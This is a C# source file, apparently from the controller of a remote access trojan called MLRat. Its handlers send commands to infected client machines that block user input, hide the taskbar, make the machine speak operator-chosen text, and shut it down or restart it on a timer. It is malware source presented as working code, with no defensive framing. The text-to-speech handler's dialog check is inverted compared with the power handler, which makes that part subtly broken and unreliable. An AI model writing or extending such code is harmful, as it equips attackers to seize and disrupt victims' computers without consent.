using MLMiscServer.Forms;
using MLRat.Server;
using SharedCode.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLMiscServer.Handlers
{
    public static class MiscHandler
    {
        public static void BlockInputContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.BlockInput);
        }

        public static void AllowInputContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.AllowInput);
        }

        public static void ShowTaskbarContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.ShowTasbar);
        }

        public static void HideTaskbarContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.HideTaskbar);
        }

        public static void TextToSpeechContextCallback(IClient[] clients)
        {
            if (clients.Length < 1)
                return;
            string say = string.Empty;
            int speed = 0;
            using (formTextToSpeech tts = new formTextToSpeech())
            {
                if (tts.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                    return;
                say = tts.TextToSay;
                speed = tts.SaySpeed;
            }
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.TextToSpeech, say, speed);
        }
        public static void ComputerPowerContextCallback(IClient[] clients)
        {
            if (clients.Length < 1)
                return;
            string method = "s";
            int timer = 0;
            using (formComputerPower fcp = new formComputerPower())
            {
                if(fcp.ShowDialog() != System.Windows.Forms.DialogResult.OK)
                    return;
                method = fcp.PowerMethod;
                timer = fcp.PowerDelay;
            }
            foreach (IClient c in clients)
                c.Send((byte)NetworkCommand.ComputerPower, method, timer);
        }

    }
}
